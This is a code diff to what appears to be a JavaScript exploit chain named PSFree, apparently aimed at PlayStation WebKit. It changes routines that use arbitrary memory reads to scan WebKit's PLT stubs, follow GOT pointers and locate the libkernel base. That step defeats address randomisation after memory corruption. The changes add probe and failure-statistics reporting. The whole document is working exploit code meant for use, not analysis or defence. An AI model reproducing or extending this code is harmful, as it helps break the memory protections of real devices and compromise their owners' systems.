@@ -669,13 +669,82 @@ function lkFromFnPtrPsfree(p, fnPtr, off, pltRva, webkitBase) {
     return null;
 }
 
+function fmtMagic4(w) {
+    if (w == null) return "null";
+    return "0x" + (w >>> 0).toString(16);
+}
+
+/** Quick poops/webkit sanity + low-text PLT density (runs once per PSFree auto). */
+function psfreeProbeBase(p, webkitBase, off, scanEnd) {
+    const base = moduleLoadBase(p, webkitBase);
+    const magic = read4p(p, base);
+    const cap = Math.min(scanEnd || 0x8000, 0x8000);
+    let stubs = 0;
+    for (let rva = 0x1000; rva < cap; rva += 4) {
+        const w0 = read4p(p, base.add32(rva));
+        if (w0 == null) continue;
+        const b0 = w0 & 0xff;
+        const b1 = (w0 >>> 8) & 0xff;
+        if (b0 === 0xff && (b1 === 0x25 || b1 === 0x15)) stubs++;
+    }
+    const samples = [];
+    const cands = importPltCandidates(off);
+    for (let i = 0; i < cands.length && i < 6; i++) {
+        const rva = cands[i];
+        const op = read2p(p, base.add32(rva));
+        let tail = op == null ? "rd-fail" : "op=0x" + op.toString(16);
+        if (op === 0x25ff || op === 0x15ff) {
+            const disp = s32(read4p(p, base.add32(rva + 2)));
+            const tgt = disp != null ? read8p(p, base.add32(rva + 6 + disp)) : null;
+            tail += tgt ? " got=" + tgt : " got=null";
+        }
+        samples.push("+0x" + rva.toString(16) + " " + tail);
+    }
+    return {
+        wk: String(webkitBase),
+        base: String(base),
+        magic: fmtMagic4(magic),
+        stubs,
+        cap: "0x" + cap.toString(16),
+        samples: samples.join(" | "),
+    };
+}
+
+function psfreeStatsLine(st) {
+    st = st || {};
+    let s = "tried=" + (st.tried || 0)
+        + " stubs=" + (st.stubsSeen || 0)
+        + " gotNull=" + (st.gotNull || 0)
+        + " hopFail=" + (st.hopFail || 0)
+        + " fnExt=" + (st.fnExt || 0)
+        + " lkFail=" + (st.fnLkFails || 0);
+    if (st.lastFn) s += " lastFn=" + st.lastFn;
+    if (st.lastPlt != null) s += " plt+0x" + st.lastPlt.toString(16);
+    if (st.probe) s += " magic=" + st.probe.magic + " ff25=" + st.probe.stubs;
+    return s;
+}
+
 function tryOnePsfreePlt(p, webkitBase, off, pltRva) {
-    const fn = resolvePltImportAt(p, webkitBase, pltRva, off);
-    if (!fn) return null;
+    const base = moduleLoadBase(p, webkitBase);
+    const stub = base.add32(pltRva);
+    const op = read2p(p, stub);
+    if (op !== 0x25ff && op !== 0x15ff)
+        return { kind: "no-stub", pltRva, op };
+    const disp = s32(read4p(p, stub.add32(2)));
+    if (disp == null)
+        return { kind: "disp-fail", pltRva, op };
+    const raw = read8p(p, stub.add32(6 + disp));
+    if (!raw)
+        return { kind: "got-null", pltRva, op };
+    const fn = resolveImportPtr(p, base, off, raw, 0);
+    if (!fn)
+        return { kind: "hop-fail", pltRva, op, raw };
     const hit = lkFromFnPtrPsfree(p, fn, off, pltRva, webkitBase);
-    if (!hit) return { fnOnly: fn, pltRva };
+    if (!hit)
+        return { kind: "lk-fail", pltRva, fnPtr: fn };
     saveLibkernelSession(hit.lk, hit.iatRva);
     return {
+        kind: "ok",
         lk: hit.lk,
         pltRva,
         fnPtr: fn,
@@ -695,6 +764,7 @@ export function tryPsfreePltBatch(p, webkitBase, off, state, opts) {
     let reads = 0;
 
     if (!state) {
+        const probe = psfreeProbeBase(p, webkitBase, off, scanEnd);
         state = {
             phase: "cand",
             candIdx: 0,
@@ -703,18 +773,46 @@ export function tryPsfreePltBatch(p, webkitBase, off, state, opts) {
             cursor: 0x1000,
             end: scanEnd,
             tried: 0,
+            stubsSeen: 0,
+            gotNull: 0,
+            hopFail: 0,
+            fnExt: 0,
+            fnLkFails: 0,
+            probe,
+        };
+        return {
+            done: false,
+            ok: false,
+            state,
+            phase: "probe",
+            probe,
         };
     }
 
-    function notePsfreeTry(pltRva, hit) {
+    function notePsfreeTry(pltRva, res) {
         state.lastPlt = pltRva;
-        if (hit && hit.lk) {
-            state.lastFn = hit.fnPtr;
-            return hit;
+        if (!res) return null;
+        if (res.kind === "no-stub" || res.kind === "disp-fail") return null;
+        state.stubsSeen = (state.stubsSeen || 0) + 1;
+        state.tried++;
+        if (res.kind === "got-null") {
+            state.gotNull = (state.gotNull || 0) + 1;
+            return null;
         }
-        if (hit && hit.fnOnly) {
-            state.lastFn = hit.fnOnly;
+        if (res.kind === "hop-fail") {
+            state.hopFail = (state.hopFail || 0) + 1;
+            if (!state.lastRaw) state.lastRaw = res.raw;
+            return null;
+        }
+        if (res.kind === "lk-fail") {
+            state.fnExt = (state.fnExt || 0) + 1;
+            state.lastFn = res.fnPtr;
             state.fnLkFails = (state.fnLkFails || 0) + 1;
+            return null;
+        }
+        if (res.kind === "ok" && res.lk) {
+            state.lastFn = res.fnPtr;
+            return res;
         }
         return null;
     }
@@ -723,7 +821,6 @@ export function tryPsfreePltBatch(p, webkitBase, off, state, opts) {
         const cands = state.cands || IMPORT_PLT_CANDS;
         while (state.candIdx < cands.length && reads + 8 <= MAX_READS) {
             const pltRva = cands[state.candIdx++];
-            state.tried++;
             reads += 8;
             const hit = notePsfreeTry(pltRva, tryOnePsfreePlt(p, webkitBase, off, pltRva));
             if (hit) {
@@ -768,7 +865,6 @@ export function tryPsfreePltBatch(p, webkitBase, off, state, opts) {
                 if (rel == null) continue;
                 const destRva = insnRva + 5 + rel;
                 if (destRva < 0x1000 || destRva >= state.end) continue;
-                state.tried++;
                 reads += 7;
                 const hit = notePsfreeTry(destRva, tryOnePsfreePlt(p, webkitBase, off, destRva));
                 if (hit) {
@@ -792,7 +888,6 @@ export function tryPsfreePltBatch(p, webkitBase, off, state, opts) {
             }
             if (bytes[i] !== 0xff) continue;
             if (bytes[i + 1] !== 0x15 && bytes[i + 1] !== 0x25) continue;
-            state.tried++;
             reads += 7;
             const hit = notePsfreeTry(insnRva, tryOnePsfreePlt(p, webkitBase, off, insnRva));
             if (hit) {
@@ -816,13 +911,7 @@ export function tryPsfreePltBatch(p, webkitBase, off, state, opts) {
     }
 
     if (state.cursor >= state.end) {
-        const wkBase = moduleLoadBase(p, webkitBase);
-        const fnOk = state.lastFn && plausibleExtPtr(state.lastFn, wkBase, off);
-        let err = "PSFree PLT exhausted";
-        if (state.fnLkFails > 0)
-            err += " fn-resolved-but-lk-fail=" + state.fnLkFails;
-        if (fnOk)
-            err += " lastFn=" + state.lastFn + " plt+0x" + (state.lastPlt || 0).toString(16);
+        const err = "PSFree PLT exhausted — " + psfreeStatsLine(state);
         return {
             done: true,
             ok: false,
@@ -832,7 +921,13 @@ export function tryPsfreePltBatch(p, webkitBase, off, state, opts) {
             tried: state.tried,
             lastFn: state.lastFn,
             lastPlt: state.lastPlt,
+            lastRaw: state.lastRaw,
             fnLkFails: state.fnLkFails || 0,
+            stubsSeen: state.stubsSeen || 0,
+            gotNull: state.gotNull || 0,
+            hopFail: state.hopFail || 0,
+            fnExt: state.fnExt || 0,
+            probe: state.probe,
         };
     }
 
@@ -840,11 +935,14 @@ export function tryPsfreePltBatch(p, webkitBase, off, state, opts) {
         done: false,
         ok: false,
         state,
-        phase: "scan",
+        phase: state.phase === "cand" ? "cand" : "scan",
         cursor: state.cursor,
         tried: state.tried,
         lastPlt: state.lastPlt,
         lastFn: state.lastFn,
+        stubsSeen: state.stubsSeen || 0,
+        fnExt: state.fnExt || 0,
+        fnLkFails: state.fnLkFails || 0,
     };
 }
 
@@ -2056,7 +2154,7 @@ export function resolveLibkernelPsfree(p, webkitBase, off, opts) {
         const pltRva = cands[i];
         if (pltRva >= cap) continue;
         const hit = tryOnePsfreePlt(p, webkitBase, off, pltRva);
-        if (hit) {
+        if (hit && hit.kind === "ok" && hit.lk) {
             log("LK-PSFREE", "plt+0x" + pltRva.toString(16) + " → " + hit.lk
                 + " (" + hit.via + ")");
             return {
@@ -2263,21 +2361,18 @@ function scanPsfreePltChunk(p, webkitBase, off, state) {
             if (!state.seen[key]) {
                 state.seen[key] = 1;
                 state.tried++;
-                const fn = resolvePltImportAt(p, webkitBase, rva, off);
-                if (fn) {
-                    const hit = lkFromFnPtrPsfree(p, fn, off, rva, webkitBase);
-                    if (hit) {
-                        saveLibkernelSession(hit.lk, hit.iatRva);
-                        return {
-                            done: true,
-                            lk: hit.lk,
-                            iatRva: hit.iatRva,
-                            source: "psfree-scan+" + rva.toString(16),
-                            state,
-                            phase: "psfree-hit",
-                            tried: state.tried,
-                        };
-                    }
+                const res = tryOnePsfreePlt(p, webkitBase, off, rva);
+                if (res && res.kind === "ok" && res.lk) {
+                    saveLibkernelSession(res.lk, res.pltRva);
+                    return {
+                        done: true,
+                        lk: res.lk,
+                        iatRva: res.pltRva,
+                        source: "psfree-scan+" + rva.toString(16),
+                        state,
+                        phase: "psfree-hit",
+                        tried: state.tried,
+                    };
                 }
             }
         }
